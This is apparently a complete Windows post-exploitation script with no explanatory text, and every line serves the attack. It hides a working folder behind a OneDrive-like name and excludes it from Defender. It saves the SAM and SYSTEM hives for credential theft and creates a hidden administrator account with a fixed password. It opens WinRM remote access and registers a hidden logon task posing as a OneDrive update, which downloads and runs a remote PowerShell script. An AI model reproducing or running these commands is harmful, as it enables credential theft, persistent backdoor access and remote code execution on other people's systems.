cd $env:SystemRoot\System32
mkdir Microsoft_OneDrive
Set-MpPreference -ExclusionPath $env:SystemRoot\System32\Microsoft_OneDrive
cd Microsoft_OneDrive
reg save HKLM\sam ./sam.save
reg save HKLM\system ./system.save
NET USER AWORTH Imperator877 /ADD
NET LOCALGROUP Administrators AWORTH /ADD
winrm quickconfig -quiet
NETSH ADVFIREWALL FIREWALL ADD RULE NAME="Windows Remote Management for RD" PROTOCOL=TCP LOCALPORT=5985 DIR=IN ACTION=ALLOW PROFILE=PUBLIC,PRIVATE,DOMAIN
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v AWORTH /t REG_DWORD /d 0
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f




$action = New-ScheduledTaskAction -Execute 'powershell' -Argument '-w h -NoP -NonI -Exec Bypass $BPP = iwr https://github.com/skekic16/lol/raw/main/BPP.ps1?dl=1; invoke-expression $BPP'
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserID 'DOMAIN\user' -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable
$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
Register-ScheduledTask T1 -InputObject $task -Force -TaskName Microsoft_OneDrive_Update -User $env:UserName
